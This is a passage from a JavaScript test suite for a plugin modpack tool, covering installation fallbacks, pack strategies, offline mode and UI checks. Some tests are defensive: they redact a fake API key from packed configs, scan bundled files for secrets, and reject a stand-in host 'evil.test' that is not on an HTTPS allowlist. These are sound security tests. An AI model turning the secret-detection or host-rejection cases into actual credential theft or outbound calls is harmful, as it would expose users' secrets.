  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '[]\n')
  const manifest = normalizeManifest({
    schema: 1,
    kind: 'dsh-modpack',
    format: 'lite',
    createdAt: new Date().toISOString(),
    name: '回退包',
    plugins: [{ name: 'demo-plugin', version: '', source: 'npm' }],
  })
  const run = await installPack({
    manifest,
    entries: [],
    config: baseConfig,
    options: { applyConfig: false, keepLocal: false, enableBundles: false, deferExisting: false },
    context: {
      profileDir: targetProfile,
      resolveMarket: async () => null,
      resolveSource: async () => {
        const dir = path.join(targetHome, 'resolved', 'demo-plugin')
        fs.mkdirSync(dir, { recursive: true })
        fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'demo-plugin', version: '0.0.1' }))
        return dir
      },
      runCli: async () => ({ code: 0, output: 'fake' }),
    },
  })
  assertEqual(run.ok, true, '装包内副本本身应当成功')
  assert(run.lines.some((line) => line.includes('显示成本地安装')), '回退到包内副本时要说明市场会显示成本地：' + JSON.stringify(run.lines))
})

await testAsync('安装：包里取自市场时，关掉「优先市场」也仍按市场版本装', async () => {
  const targetHome = tmpDir('market-source')
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '[]\n')
  const manifest = normalizeManifest({
    schema: 1,
    kind: 'dsh-modpack',
    format: 'lite',
    createdAt: new Date().toISOString(),
    name: '市场来源包',
    plugins: [{ name: 'demo-plugin', version: '1.2.3', source: 'npm' }],
  })
  const calls = []
  const run = await installPack({
    manifest,
    entries: [],
    config: baseConfig,
    options: { preferMarket: false, applyConfig: false, keepLocal: false, enableBundles: false, deferExisting: false },
    context: {
      profileDir: targetProfile,
      resolveMarket: async (plugin) => ({ spec: plugin.name + '@' + plugin.version, version: plugin.version }),
      runCli: async (profile, args) => { calls.push(args[args.length - 1]); return { code: 0, output: 'fake' } },
    },
  })
  assertEqual(run.ok, true, '安装应成功')
  assertEqual(calls[calls.length - 1], 'demo-plugin@1.2.3', '市场来源的包关了开关也走市场版本，实际：' + calls[calls.length - 1])
  const action = run.actions.find((a) => a.plugin === 'demo-plugin')
  assertEqual(action.source, 'market', '动作里要标成市场来源')
})

await testAsync('独立安装器：市场来源的插件先按市场版本装，失败才退回包内那份', async () => {
  const source = fs.readFileSync(new URL('../assets/install-stub.mjs', import.meta.url), 'utf8')
  assert(source.includes("plugin.source === 'npm' || plugin.source === 'market'"), '安装器要识别市场来源')
  assert(
    source.indexOf("from: 'market'") < source.indexOf("from: 'pack'"),
    '市场那次尝试要排在包内副本之前',
  )
  assert(source.includes('市场版本没装上，改用包内自带的那份再试一次'), '失败要提示退回包内副本')
})

// —— 优化项：配置擦除、扫描去重、管理器安装 ——
test('配置快照：疑似凭据在打包前就被擦掉', () => {
  const patch = [
    '- id: demo-plugin',
    '  name: demo-plugin',
    '  config:',
    '    apiKey: sk-abcdefghijklmnopqrstuvwxyz',
    '    endpoint: https://example.com/v1',
    '    apiKeyEnv: DEMO_KEY',
    '',
  ].join('\n')
  const { captured, notes } = captureConfigs(patch, [{ name: 'demo-plugin' }], (text) => parseYaml(text))
  const snap = captured.get('demo-plugin')
  assert(snap, '应抓到这份配置')
  assertEqual(snap.config.apiKey, '${REDACTED}')
  assertEqual(snap.config.endpoint, 'https://example.com/v1')
  assertEqual(snap.config.apiKeyEnv, 'DEMO_KEY', '写环境变量名的字段不该被误伤')
  assertEqual(snap.configRedacted, ['apiKey'])
  assert(notes.some((note) => note.includes('REDACTED')), '应说明擦了哪里')
})

test('扫描：同内容的多份文件各自报一次，不重复扫', () => {
  const body = Buffer.from('const key = "sk-abcdefghijklmnopqrstuvwxyz"\n')
  const scan = scanEntries([
    { name: 'a/lib/x.js', data: body },
    { name: 'b/lib/x.js', data: body },
  ])
  const a = scan.findings.filter((f) => f.file === 'a/lib/x.js')
  const b = scan.findings.filter((f) => f.file === 'b/lib/x.js')
  assert(a.length > 0, '第一份要报')
  assertEqual(b.map((f) => f.rule), a.map((f) => f.rule), '第二份应复用同一批规则命中')
})

await testAsync('安装：宿主有插件管理器时走服务，不再调命令行', async () => {
  const targetHome = tmpDir('manager-home')
  const target = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(target, { recursive: true })
  fs.writeFileSync(path.join(target, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(target, 'cordis.patch.yml'), '[]\n')
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }],
    options: { includePayload: true, includeConfig: false, name: '管理器安装' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })
  const managerCalls = []
  let cliCalls = 0
  const run = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: true },
    context: {
      profileDir: target,
      installBundle: async (spec, opts) => {
        managerCalls.push({ spec, opts })
        return { changed: true, stage: 'install', target: spec, application: 'restart-required' }
      },
      runCli: async () => { cliCalls += 1; return { code: 0, output: 'cli' } },
      resolveMarket: async () => null,
    },
  })
  assertEqual(run.ok, true)
  assertEqual(managerCalls.length, 1, '应该只调用一次插件管理器')
  assert(managerCalls[0].spec === 'demo-plugin@1.2.3', '完整包应先按市场版本交给管理器（依赖写成 ^版本，市场才认市场版），实际：' + managerCalls[0].spec)
  assertEqual(cliCalls, 0, '走管理器时不该再调命令行')
  assertEqual(run.needsRestart, true, '管理器说要重启，结果也要说要重启')
})

await testAsync('打包策略：完整包带本体，轻量包只记版本，混合包只把需要的插件打成完整', async () => {
  const { profileDir, installed } = await fixture()
  const base = { selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }], config: { ...DEFAULT_CONFIG }, context: { profileDir, installed, dshVersion: '1.0.0', parsePatch: (t) => parseYaml(t), patchText: '[]\n' } }
  const full = await buildPack({ ...base, options: { confirmLicense: true, strategy: 'full' } })
  const lite = await buildPack({ ...base, options: { confirmLicense: true, strategy: 'lite' } })
  const hybrid = await buildPack({ ...base, options: { confirmLicense: true, strategy: 'hybrid' } })
  const hybridBase = await buildPack({ ...base, selection: [{ name: 'demo-plugin', source: 'profile', mode: 'base' }], options: { confirmLicense: true, strategy: 'hybrid' } })
  assertEqual(full.manifest.format, 'full')
  assertEqual(lite.manifest.format, 'lite')
  assertEqual(hybrid.manifest.format, 'hybrid')
  const fullNames = readZip(full.buffer).map((e) => e.name)
  const liteNames = readZip(lite.buffer).map((e) => e.name)
  const hybridNames = readZip(hybrid.buffer).map((e) => e.name)
  const hybridBaseNames = readZip(hybridBase.buffer).map((e) => e.name)
  assert(fullNames.some((n) => n.startsWith('plugins/')), '完整包应带插件本体')
  assert(!liteNames.some((n) => n.startsWith('plugins/')), '轻量包不该带插件本体')
  // 混合包按插件分档：要带走本机改动的（mode: local）连本体一起打，按原版装的（mode: base）只记版本
  assert(hybridNames.some((n) => n.startsWith('plugins/')), '混合包：要带走本机改动的插件应连本体一起打')
  assertEqual(hybrid.manifest.plugins[0].embedded, true, '这个插件在混合包里应标 embedded')
  assert(!hybridBaseNames.some((n) => n.startsWith('plugins/')), '混合包：按原版装的插件只记版本')
  assertEqual(hybridBase.manifest.plugins[0].embedded, false, '按原版装的插件不该 embedded')
  assert(hybrid.size > lite.size, '混合包比轻量包大一点（带上了需要完整打包的那部分）')
  assert(hybrid.size < full.size, '混合包应比完整包小（不是所有插件都带本体）')
})

test('混合包：安装侧按「包里有没有这个插件的目录」决定连不联网', () => {
  const installSrc = fs.readFileSync(new URL('../lib/install.mjs', import.meta.url), 'utf8')
  const stubSrc = fs.readFileSync(new URL('../assets/install-stub.mjs', import.meta.url), 'utf8')
  assert(installSrc.includes('let embedded = false'), '安装逻辑应记下这个插件是不是随包带来')
  assert(installSrc.includes('if (pluginPayload(entries, plugin.dirName || plugin.name).length > 0)'), '包里带代码就直接用包内副本')
  assert(installSrc.includes('if (!embedded) {'), '只有没带代码的插件才需要联网取包')
  assert(stubSrc.includes('const hasCode = fs.existsSync(packedDir)'), '独立安装器也按插件判断，而不是看整包 format')
})


test('策略可用性：没有确定版本号又不能自带代码的插件，连混合包也选不了', () => {
  const src = fs.readFileSync(new URL('../index.js', import.meta.url), 'utf8')
  assert(src.includes("id: 'lite'"), '应有轻量包策略描述')
  assert(src.includes("id: 'hybrid'"), '应有混合包策略描述')
  assert(src.includes('这些插件没有确定的版本号'), '不可选时要给出原因')
  // 判定逻辑集中在一个地方算：路由与打包校验共用，避免两边不一致
  assert(src.includes('const computePlan = (selection) =>'), '策略判定应抽成 computePlan')
  assert(src.includes('const versionOf = (item, entry) =>'), '版本号要能从 spec（名字@版本）里抠出来')
  assert(src.includes('const liteBlockers = []'), '轻量包的可选性要有单独判定')
  assert(src.includes('带不走配置与数据'), '给某插件选了自定义配置时，轻量包要说明带不走')
  // 混合包：本机有代码的插件（没有确定版本也可以连本体打进来），只有「没版本又没代码」才拦
  assert(src.includes('const noCodeNoVersion = noVersion.filter((r) => !r.local)'), '混合包应只拦「没版本也没代码」的插件')
  assert(src.includes('本机又没装、取不到代码'), '混合包被拦时要说明原因')
  assert(src.includes("/dsh-modpack-kit/api/pack/plan"), '应有策略可用性路由')
  assert(src.includes('return json(res, 200, { ok: true, ...computePlan(selection) })'), '路由应复用 computePlan')
  assert(src.includes('这个打包策略现在不适用：'), '打包时要再校验一次策略，不能只靠界面')
  assert(src.includes('strategy: (() => {'), '打包时应透传 strategy')
})

test('打包界面：策略三选一、安全检查勾选已隐藏、版本号只读', () => {
  const src = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(src.includes('STRATEGY_INFO'), '应有三策略卡片说明')
  assert(src.includes('/pack/plan'), '界面应向服务端问策略可用性')
  assert(src.includes('打包策略（必选）'), '标题应是「打包策略（必选）」')
  assert(!src.includes('"包选项"'), '旧的「包选项」标题应已换掉')
  assert(src.includes('const planEntries = Array.isArray(plan) ? plan : []'), '应把判定结果整理成 planEntries')
  assert(src.includes('const currentBlocked = (() => {'), '当前策略不适用时要能看出来')
  assert(src.includes('"不可选"'), '不可选的卡片要有「不可选」标记')
  assert(src.includes('cursor: disabled ? "not-allowed" : "pointer"'), '不可选的卡片鼠标应是禁止符号')
  assert(src.includes('firePackNag(item.reason || "这个策略现在不能选")'), '点不可选的卡片要弹出原因')
  assert(src.includes('strategyNotice'), '当前策略不适用时要给提示并可一键换')
  assert(!src.includes('包含插件本体（关=轻量版）'), '懒人/轻量勾选应已删除')
  assert(!src.includes('打包前安全检测（强制）'), '安全检查勾选应隐藏')
  assert(!src.includes('onChange: (e) => setSpec(entry.name, e.target.value)'), '版本号不该能手改')
})

test('安装预览：逐插件勾选、问题优先、分组同步与整体启用选项都在', () => {
  const src = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(src.includes('const previewRows ='), '应算出按问题排序的预览行')
  assert(src.includes('.sort((a, b) => (b.problems.length > 0 ? 1 : 0) - (a.problems.length > 0 ? 1 : 0))'), '有问题的插件应排前面')
  assert(src.includes('安装后整体启用'), '应有整体启用开关')
  assert(src.includes('安装后同步插件市场分组'), '应有分组同步开关')
  assert(src.includes('包内配置'), '每个插件可选包内配置')
  assert(src.includes('保持本机'), '每个插件可选保持本机配置')
})

await testAsync('安装：插件管理器报错时自动退回命令行', async () => {
  const targetHome = tmpDir('manager-fallback')
  const target = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(target, { recursive: true })
  fs.writeFileSync(path.join(target, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(target, 'cordis.patch.yml'), '[]\n')
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }],
    options: { includePayload: true, includeConfig: false, name: '管理器退回' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })
  let cliCalls = 0
  const run = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false },
    context: {
      profileDir: target,
      installBundle: async () => { throw new Error('pnpm 起不来') },
      runCli: async () => { cliCalls += 1; return { code: 0, output: 'cli ok' } },
      resolveMarket: async () => null,
    },
  })
  assertEqual(run.ok, true)
  assertEqual(cliCalls, 1, '管理器失败后应该用命令行补一次')
  assert(run.lines.some((line) => line.includes('改用命令行重试')), '应留下退回说明')
})

await testAsync('patch yml：只有注释和 [] 的空文档也能安全追加（新 profile 的默认写法）', async () => {
  const { upsertPatchItem, parseYaml } = await import('../lib/yamlish.mjs')
  const before = '# Your patch layer for this dsh profile, applied after every bundle layer:\n[]\n'
  const { text: after, action } = upsertPatchItem(before, { id: 'demo', name: 'demo-plugin', config: { a: 1 } })
  assertEqual(action, 'inserted')
  const parsed = parseYaml(after)
  assertEqual(parsed.length, 1, '追加后应当只有一个条目，实际解析：' + JSON.stringify(parsed))
  assertEqual(parsed[0].id, 'demo')
})

await testAsync('patch yml：同一个 id 有多条时改最后那条，并清掉前面的重复', async () => {
  const { upsertPatchItem, parseYaml } = await import('../lib/yamlish.mjs')
  const before = [
    '- id: demo',
    '  name: demo-plugin',
    '  config:',
    '    enabled: true',
    '- id: demo',
    '  name: demo-plugin',
    '  disabled: true',
    '',
  ].join('\n')
  const { text: after, action } = upsertPatchItem(before, { id: 'demo', name: 'demo-plugin', config: { enabled: false } })
  assertEqual(action, 'replaced')
  const parsed = parseYaml(after)
  assertEqual(parsed.length, 1, '重复条目应当合并成一条，实际：' + JSON.stringify(parsed))
  assertEqual(parsed[0].config.enabled, false, '应当改到生效的那条（最后一条）上')
  assert(!parsed[0].disabled, "被合并掉的那条 disabled 不该复活")
})

await testAsync('打包页草稿：勾选与选项留在内存里，切页签不丢；不落 localStorage', async () => {
  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(source.includes('const packDraft = { value: { selected: null, options: null }'), '要有模块级草稿容器')
  assert(source.includes('const [selected, setSelected] = useState(() =>'), '勾选状态要从草稿恢复')
  assert(source.includes('setPackDraft({ selected })'), '勾选变化要写回草稿')
  assert(source.includes('setPackDraft({ options })'), '打包选项变化也要写回草稿')
  assert(!source.includes('localStorage.setItem("dsh-modpack-kit:draft'), '草稿不能落盘：重启 DSH 就该重置')
})

test('网络层：只放 https，而且主机要在允许列表里', () => {
  const config = { allowHosts: ['registry.npmjs.org', 'example.com'] }
  assertAllowedUrl('https://registry.npmjs.org/dsh-modpack-kit', config)
  assertAllowedUrl('https://cdn.registry.npmjs.org:443/x', config)
  assertAllowedUrl('https://www.example.com/a', config)
  let error = null
  try { assertAllowedUrl('http://registry.npmjs.org/x', config) } catch (e) { error = e }
  assert(error && /只允许 https/u.test(error.message), 'http 应被拒')
  error = null
  try { assertAllowedUrl('https://evil.test/x', config) } catch (e) { error = e }
  assert(error && /不在允许列表/u.test(error.message), '白名单外主机应被拒')
})

test('网络层：curl 输出能拆出状态码、头与体', () => {
  const parsed = parseCurlResponse(Buffer.from('HTTP/1.1 302 Found\r\nlocation: https://registry.npmjs.org/x\r\nset-cookie: a=1\r\n\r\nhello', 'latin1'))
  assertEqual(parsed.status, 302)
  assertEqual(parsed.headers.get('location'), 'https://registry.npmjs.org/x')
  assertEqual(parsed.body.toString('utf8'), 'hello')
})

test('网络层：超时与重试有默认值，且被夹在合理范围', () => {
  assertEqual(DEFAULT_CONFIG.netTimeoutSeconds, NET_DEFAULTS.timeoutMs / 1000)
  assertEqual(DEFAULT_CONFIG.netRetries, NET_DEFAULTS.retries)
  assertEqual(DEFAULT_CONFIG.curlFallback, true)
  assertEqual(clampConfig({ ...DEFAULT_CONFIG, netTimeoutSeconds: 9999 }).netTimeoutSeconds, 120)
  assertEqual(clampConfig({ ...DEFAULT_CONFIG, netTimeoutSeconds: 1 }).netTimeoutSeconds, 5)
  assertEqual(clampConfig({ ...DEFAULT_CONFIG, netRetries: 99 }).netRetries, 5)
})

test('市场分组：读人家的 state.json，缺失就当作没有分组', () => {
  const home = tmpDir('groups-home')
  const profile = path.join(home, 'profiles', 'desktop')
  fs.mkdirSync(path.join(profile, '.dsh-market'), { recursive: true })
  fs.writeFileSync(path.join(profile, '.dsh-market', 'state.json'), JSON.stringify({
    groups: { bili: ['a', 'b', 'ghost', 'a'], other: [] },
    groupOrder: ['bili', 'missing', 'other'],
    disabled: ['a', 'a'],
  }))
  const market = readMarketGroups(profile)
  assertEqual(market.present, true)
  assertEqual(market.order.join(','), 'bili,other')
  assertEqual(market.groups.bili.join(','), 'a,b,ghost')
  assertEqual(market.disabled.join(','), 'a')
  assertEqual(readMarketGroups(path.join(home, 'nope')).present, false)
  fs.writeFileSync(path.join(profile, '.dsh-market', 'state.json'), 'not json')
  assertEqual(readMarketGroups(profile).present, false)
})

test('市场分组：成员分成本机有与没有的，其余进未分组', () => {
  const market = { present: true, order: ['bili'], groups: { bili: ['a', 'ghost'] }, disabled: [] }
  const view = groupViews([{ name: 'a' }, { name: 'c' }], market)
  assertEqual(view.groups.length, 1)
  assertEqual(view.groups[0].members.join(','), 'a')
  assertEqual(view.groups[0].missing.join(','), 'ghost')
  assertEqual(view.ungrouped.join(','), 'c')
  assertEqual(groupViews([{ name: 'a' }], { present: false, order: [], groups: {}, disabled: [] }).ungrouped.join(','), 'a')
})

test('选插件界面：分组头不再算兼容，明细代码一并清掉', () => {
  const client = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  const host = fs.readFileSync(new URL('../index.js', import.meta.url), 'utf8')
  // 服务端不再给分组算兼容
  assert(!host.includes('findings: result.findings'), 'index.js 不该再往分组里塞兼容明细')
  assert(!host.includes('compat = { level:'), 'index.js 不该再算分组兼容结论')
  assert(host.includes('groups = views.groups.map((group) => ({ name: group.name, members: group.members, missing: group.missing }))'), '分组只留成员与缺失成员')
  // 客户端不留标记、明细块、滚动逻辑
  for (const mark of ['compatOpen', 'openCompat', 'compatRefs', 'compatColor', 'compatText', '兼容：']) {
    assert(!client.includes(mark), 'client.js 不该再留 ' + mark)
  }
  // 装之前的兼容列表仍在（那是真正有用的提示）
  assert(client.includes('function CompatList(props)'), '打包/安装结果里的兼容列表要保留')
  assert(host.includes('compat: compatFor(inspected.manifest)'), 'inspect 的兼容检查要保留')
})

test('显示名：侧栏、设置、插件页与页面标题都叫「整合包」', () => {
  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  const labels = source.match(/label: \(\) => "[^"]+"/g) || []
  const pluginLabels = labels.filter((line) => line.includes('整合包'))
  assertEqual(pluginLabels.length, 4)
  for (const line of pluginLabels) assertEqual(line, 'label: () => "整合包"')
  assert(!source.includes('整合包modpack-kit'), '不该再留着「整合包modpack-kit」')
  assert(source.includes('fontWeight: 600 } }, "整合包")'), '页面标题也应是「整合包」')
  const zh = JSON.parse(fs.readFileSync(new URL('../locale/zh.json', import.meta.url), 'utf8'))
  assertEqual(zh.meta.title, '整合包')
})

test('启动时就补挂槽位：自己拉状态并重试几次，别等用户先去看设置', () => {
  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(source.includes('const refreshPlacement = async (left) => {'), '应自己拉一次 /status 拿开关')
  assert(source.includes('refreshPlacement(3)'), '启动时拉一次、失败再退避重试')
  assert(source.includes('[900, 2600, 6000, 11000]'), '前十秒补看几次，晚声明的槽位也能挂上')
  assert(source.includes('for (const timer of timers) clearTimeout(timer)'), '卸载时要清掉定时器')
})

test('选插件界面：分组可折叠、可一键加入', () => {
  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  for (const mark of ['const sections = useMemo', 'const renderList = () =>', '一键加入', '清空本组', 'folded[section.name]', 'renderOne(entry)']) {
    assert(source.includes(mark), 'client.js 应包含 ' + mark)
  }
  const host = fs.readFileSync(new URL('../index.js', import.meta.url), 'utf8')
  assert(host.includes("from './lib/groups.mjs'"), 'index.js 应导入 groups 模块')
  assert(host.includes('groupViews('), 'index.js 应用 groupViews')
  assert(host.includes('groupSource = market.present'), 'index.js 应记录分组来源')
})

test('最近记录：能按时间删一条，也能整体清空', () => {
  const home = tmpDir('history-home')
  const before = process.env.DSH_HOME
  process.env.DSH_HOME = home
  try {
    appendHistory({ kind: 'pack', name: 'a' })
    appendHistory({ kind: 'install', name: 'b' })
    const list = readHistory()
    assertEqual(list.length, 2, '应有两条记录')
    assertEqual(list[0].name, 'b', '新的记在前面')
    const newest = list[0].at
    const left = removeHistory(newest)
    assertEqual(left.length, 1, '删掉一条后剩一条')
    assertEqual(left[0].name, 'a', '留下的是另一条')
    assertEqual(readHistory().length, 1, '删除要落盘')
    const empty = clearHistory()
    assertEqual(empty.length, 0, '清空返回空列表')
    assertEqual(readHistory().length, 0, '清空要落盘')
  } finally {
    if (before === undefined) delete process.env.DSH_HOME
    else process.env.DSH_HOME = before
  }
})

test('安装导入页：安全检测与兼容性整块可折叠，最近记录可折叠可删', () => {
  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  for (const mark of [
    'function FoldBox(props)',
    'title: "安全检测"',
    'title: "兼容性"',
    'title: "最近记录"',
    '清空记录',
    '清空最近记录',
    'props.actions',
    'dropHistory(item, false)',
    '离线安装（不联网，直接用包里自带的）',
  ]) {
    assert(source.includes(mark), 'client.js 应包含 ' + mark)
  }
  // 两块报告都改成 FoldBox（不再各画一行标题 + 单独按钮）
  assert(/h\(FoldBox, \{\s*title: "安全检测"/u.test(source), 'ScanReport 应走 FoldBox')
  assert(/h\(FoldBox, \{\s*title: "兼容性"/u.test(source), 'CompatList 应走 FoldBox')
  assert(!source.includes('toggleOpen'), '旧的单独展开按钮应已移除')
  const host = fs.readFileSync(new URL('../index.js', import.meta.url), 'utf8')
  assert(host.includes("'/dsh-modpack-kit/api/history/clear'"), 'index.js 应有清空记录路由')
  assert(host.includes("'/dsh-modpack-kit/api/history/remove'"), 'index.js 应有删除单条路由')
  assert(host.includes('probeRegistry: () => probeRegistry(config)'), 'index.js 应把探测交给 installPack')
})

test('离线安装：探不到 registry 就用包里自带的那份', () => {
  const inst = fs.readFileSync(new URL('../lib/install.mjs', import.meta.url), 'utf8')
  for (const mark of [
    "let offline = options.offline === true",
    'offline = !(await context.probeRegistry())',
    'const fromMarketSource = !offline &&',
    'if (!offline && !marketHit && (options.preferMarket !== false || fromMarketSource)',
    '当前没网：这个包只记版本、没带本体，装不了',
  ]) {
    assert(inst.includes(mark), 'install.mjs 应包含 ' + mark)
  }
  const stub = fs.readFileSync(new URL('../assets/install-stub.mjs', import.meta.url), 'utf8')
  assert(stub.includes("const offline = has('--offline')"), '安装器要认 --offline')
  assert(stub.includes('--offline         不联网'), '用法里要写清 --offline')
  assert(stub.includes("const fromMarket = !offline &&"), '离线时不先问市场')
  const reg = fs.readFileSync(new URL('../lib/registry.mjs', import.meta.url), 'utf8')
  assert(reg.includes('export async function probeRegistry'), 'registry 应导出 probeRegistry')
  assert(reg.includes("'/-/ping'"), '探测应打 /-/ping')
})

test('请求体解析只有一处：路由统一用 readJsonBody，别再手写 asJson(await readBody(req))', () => {
  const text = fs.readFileSync(new URL('../index.js', import.meta.url), 'utf8')
  assert(text.includes('readJsonBody'), 'index.js 要引入统一助手')
  assert(!/\basJson\(/.test(text), 'index.js 里不该再手写 asJson(…)：容易漏 await 或忘给默认值')
  const http = fs.readFileSync(new URL('../lib/http.mjs', import.meta.url), 'utf8')
  assert(http.includes('export const readJsonBody = async (req, fallback = {}, limit = MAX_JSON_BODY) =>'), '助手要能带体积上限（drop 路由用 256 MB）')
})

test('轻量包取不到版本时要给出替代方案（不是干巴巴报错）', () => {
  const src = fs.readFileSync(new URL('../lib/install.mjs', import.meta.url), 'utf8')
  assert(src.includes('轻量包只记版本号，市场上没有这个版本时就装不回来'), '要解释为什么装不回来')
  assert(src.includes('完整包或混合包'), '要给出可操作的替代方案')
  assert(src.includes('元数据缺少') && src.includes('没有版本信息'), 'registry 侧「没有这个版本」的几种说法也要算进这一类')
})
test('AI 搜索：借用插件市场新接口，旧版市场自动退回关键词', () => {
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(cli.includes('"/dsh-market/ai-search"'), '要走插件市场的 AI 搜索接口，而不是自己再实现一遍模型调用')
  assert(cli.includes('function marketAiSearchReady()'), '先探一次路由，旧版市场没有这条就不要显示开关')
  assert(cli.includes('function readAiSearchPref()') && cli.includes('dsh-modpack-kit:ai-search'), '开关状态存本地，刷新后还在')
  assert(cli.includes('credentials: "same-origin"'), '同源请求要带上鉴权 cookie，否则宿主会 401')
  assert(cli.includes('AI 搜索：开') && cli.includes('AI 来找'), '界面上要有开关与触发按钮')
  assert(cli.includes('当前装的插件市场没有 AI 搜索'), '旧版/没装时要说明为什么没有开关')
  assert(cli.includes('AI 搜索的 token 消耗记在插件市场那边'), '要写明 token 扣在市场那边，不是本插件')
  assert(cli.includes('e.key === "Enter"'), '回车触发 AI 搜索')
  const idx = fs.readFileSync(new URL('../index.js', import.meta.url), 'utf8')
  assert(idx.includes('const searchCache = new Map()'), '关键词搜索要有短缓存，翻页/切分类不必重算')
  assert(idx.includes('searchCache.get(cacheKey)') && idx.includes('searchCache.size > 40'), '缓存要有命中与容量上限')
})

test('插件市场：设置里能强制关掉它在侧栏里的那一行，悬浮写明理由', () => {
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  const store = fs.readFileSync(new URL('../lib/store.mjs', import.meta.url), 'utf8')
  assert(store.includes('forceHideMarketSidebar: false'), '设置项要有默认值，默认不关别人家的东西')
  assert(cli.includes('const MARKET_SIDEBAR_ROUTE = "/dsh-market/sidebar-entry"'), '要写插件市场自己的侧栏入口接口')
  assert(cli.includes('body: JSON.stringify({ enabled: enabled === true })'), '写的是市场的 enabled，不是我们的设置')
  assert(cli.includes('强制关闭侧栏里的插件市场显示'), '设置里要有这个开关')
  assert(cli.includes('每次开机强制显示还关不掉很烦吧'), '悬浮要写主人指定的那句话')
  assert(cli.includes('forceHideMarketSidebar === true'), '开机要按设置再确认一次')
  assert(cli.includes('只关市场自己的，不动整合包'), '开关文案要写明关的是市场自己那一行')
  assert(cli.includes('与上面整合包的入口无关'), '要标明这个开关和上面的整合包入口无关')
  assert(cli.includes('不动整合包的入口'), '要说明整合包的三处显示位不受影响')
  assert(!/toggleMarketSidebar[\s\S]{0,600}savePlacement/u.test(cli), '这个开关不许顺手改整合包自己的显示位')
  assert(cli.includes('enforceMarketSidebarOff'), '插件加载时就要关一次，不必等用户点开某一栏')
  assert(cli.includes('data.config.forceHideMarketSidebar === true'), '开机确认要读服务端配置，不能只信界面状态')
})

test('标签行：刷新按钮和「设置与记录」同一行、排在最右边', () => {
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(cli.includes('await load(3)'), 'Page 要把重新读状态的能力传下去')
  assert(cli.includes('envLine, refreshNote ? h("span"'), '刷新的结果说明要显示在标签行里')
  assert(cli.includes('refreshMsg ? h("span"'), '刷新失败原因要显示在标签行里')
  assert(cli.includes('refreshBtn)'), '刷新按钮要排在标签行末尾')
  assert(cli.includes('refreshing ? "刷新中…"'), '刷新中要有反馈')
  assert(cli.includes('重新读一遍插件列表、市场目录与进度窗'), '悬浮要说明刷新做了什么')
  assert(cli.includes('setGen((n) => n + 1)'), '刷新后要让面板重挂，否则看起来像没反应')
  assert(cli.includes('key: "pack-" + gen'), '面板要用 gen 当 key')
  assert(cli.includes('刷新失败：'), '刷新失败要给出原因')
  // 刷新只管整合包自己：不调别的插件（「解除卡顿」有自己的按钮）。
  const refreshBlock = cli.slice(cli.indexOf('const doRefresh = async () => {'), cli.indexOf('const gen = props.gen'))
  assert(!refreshBlock.includes('pressUnlag'), '刷新不许去调解除卡顿')
  assert(!refreshBlock.includes('dsh-unlag'), '刷新里不该出现别的插件的接口')
  assert(refreshBlock.includes('props.onRefresh'), '刷新要重读整合包自己的状态')
  assert(cli.includes('已重新读取整合包自己的状态'), '刷完要说明只刷了自己')
  assert(cli.includes('只刷新整合包自己'), '悬浮要写明只刷新整合包自己')
})

test('进度窗：位置按像素夹边，拖动不再自动判定，展开高度固定', () => {
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  // 只保留「夹回可见区」这一件事：自动判定向上/向下、自动算高度，全部下线
  assert(cli.includes('function clampDockPos(pos, viewport, size)'), '位置只做夹边')
  assert(cli.includes('function dockFromFractions(saved, viewport)'), '换窗口时按相对坐标还原一次')
  assert(!cli.includes('dockFrame'), '不该再有任何「一帧预算布局」的家伙')
  assert(!cli.includes('column-reverse'), '不该再有向上展开')
  assert(!cli.includes('sizeOpen') && !cli.includes('sizeClosed'), '不该再记两套尺寸')
  assert(cli.includes('const DOCK_W = 300'), '宽度固定，不再按视口收窄')
  assert(cli.includes('const DOCK_OPEN_MAX_H = 420'), '展开高度固定上限，交给窗内滚动')
  assert(cli.includes('width: DOCK_W + "px"'), '宽度是常数')
